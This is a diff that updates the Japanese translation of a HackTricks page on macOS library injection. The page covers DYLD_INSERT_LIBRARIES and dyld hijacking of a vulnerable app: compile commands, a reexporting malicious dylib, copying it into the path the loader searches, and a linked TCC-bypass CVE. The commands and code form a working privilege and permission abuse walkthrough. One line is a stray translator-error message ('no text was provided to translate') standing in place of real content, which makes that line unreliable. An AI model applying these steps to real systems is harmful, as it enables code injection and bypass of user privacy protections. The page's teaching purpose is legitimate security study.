@@ -2,9 +2,9 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-## DYLD_INSERT_LIBRARIES 基本例
+## DYLD_INSERT_LIBRARIES の基本例
 
-**shell を実行するために inject する Library**:
+**shellを実行するために注入するLibrary**：
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -37,9 +37,9 @@ Injection:
 ```bash
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
-## Dyld Hijackingの例
+## Dyld Hijacking の例
 
-対象となる脆弱なバイナリは`/Applications/VulnDyld.app/Contents/Resources/lib/binary`です。
+The targeted vulnerable binary is `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
 
 {{#tabs}}
 {{#tab name="entitlements"}}
@@ -66,7 +66,7 @@ path @loader_path/../lib2 (offset 12)
 
 {{#tab name="@rpath"}}
 ```bash
-# Check librareis loaded using @rapth and the used versions
+# Check libraries loaded using @rpath and the versions used
 otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep "@rpath" -A 3
 name @rpath/lib.dylib (offset 24)
 time stamp 2 Thu Jan  1 01:00:02 1970
@@ -77,12 +77,12 @@ compatibility version 1.0.0
 {{#endtab}}
 {{#endtabs}}
 
-前述の情報から、**loaded libraries の signature をチェックしておらず**、次の場所から library を **load しようとしている**ことがわかります：
+先ほどの情報から、**ロードされた libraries の signature をチェックしていない**こと、そして以下から library を**ロードしようとしている**ことがわかります。
 
 - `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 - `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
 
-しかし、1つ目は存在しません：
+しかし、1つ目は存在しません。
 ```bash
 pwd
 /Applications/VulnDyld.app
@@ -90,7 +90,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-つまり、これを hijack することが可能です！**任意の code を実行し、正規の library を reexport することで、同じ機能を提供する** library を作成します。また、想定される versions で compile することを忘れないでください：
+したがって、これを hijack することが可能です！**任意のコードを実行し、正規の library を再エクスポートすることで同じ機能をエクスポートする** library を作成します。また、想定されるバージョンで compile することを忘れないでください：
 ```objectivec:lib.m
 #import <Foundation/Foundation.h>
 
@@ -99,12 +99,12 @@ void custom(int argc, const char **argv) {
 NSLog(@"[+] dylib hijacked in %s", argv[0]);
 }
 ```
-翻訳する英語の本文が提供されていません。対象のMarkdown内容を貼り付けてください。
+翻訳する本文が提供されていません。翻訳対象のMarkdownテキストを貼り付けてください。
 ```bash
 gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
 # Note the versions and the reexport
 ```
-library に作成された reexport path は loader を基準とした相対パスです。これを export 対象の library への絶対パスに変更しましょう。
+ライブラリ内に作成された再エクスポートパスはローダーを基準とした相対パスなので、エクスポートするライブラリへの絶対パスに変更します:
 ```bash
 #Check relative
 otool -l /tmp/lib.dylib| grep REEXPORT -A 2
@@ -121,11 +121,11 @@ cmd LC_REEXPORT_DYLIB
 cmdsize 128
 name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
 ```
-最後に、**hijacked location** にコピーするだけです:
+最後に、**ハイジャックされた場所**にコピーするだけです：
 ```bash
 cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
-そしてバイナリを **execute** し、**library was loaded** を確認します：
+そしてバイナリを **execute** し、**library がロードされたことを確認**します。
 
 <pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
 <strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
@@ -133,16 +133,15 @@ cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 </code></pre>
 
 > [!TIP]
-> Telegramのcamera permissionsをabuseしてこのvulnerabilityをabuseする方法については、[https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[[1]](#references)</sup>に詳しいwriteupがあります。
+> Telegram のカメラ権限を悪用するためにこの脆弱性を悪用する方法については、[https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) の詳しい解説を参照してください。<sup>[[1]](#references)</sup>
 
-## 大規模
+## より大規模なスケール
 
-予期しないバイナリへのlibrariesのinjectを試す場合は、event messagesを確認して、process内でlibraryがloadedされたタイミングを特定できます（この場合はprintfと`/bin/bash`のexecutionを削除します）。
+想定外のバイナリに libraries を inject しようとしている場合は、event messages を確認して、プロセス内で library がロードされたタイミングを特定できます（この場合は `printf` と `/bin/bash` の実行を削除します）。
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
-## 参考資料
+## References
 
-- [1] [CVE-2023-26818 - macOS で Telegram を使用して TCC をバイパスする](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
-
+- [1] [CVE-2023-26818 - macOSでTelegramを使用してTCCをバイパス](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
 {{#include ../../../../banners/hacktricks-training.md}}
